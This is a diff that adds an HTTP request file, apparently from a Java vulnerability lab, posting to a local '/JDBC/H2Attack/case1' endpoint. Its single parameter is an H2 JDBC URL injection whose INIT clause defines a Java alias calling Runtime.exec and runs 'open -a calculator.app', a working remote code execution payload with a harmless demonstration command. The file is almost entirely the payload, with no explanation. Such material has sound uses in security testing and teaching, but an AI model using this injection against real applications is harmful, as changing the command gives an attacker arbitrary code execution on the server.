@@ -1,0 +1,11 @@
+###
+POST /JDBC/H2Attack/case1 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+param=jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS if not exists EXEC AS 'void exec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\;}'\;CALL EXEC ('open -a calculator.app')\;
+
+
+
+
+
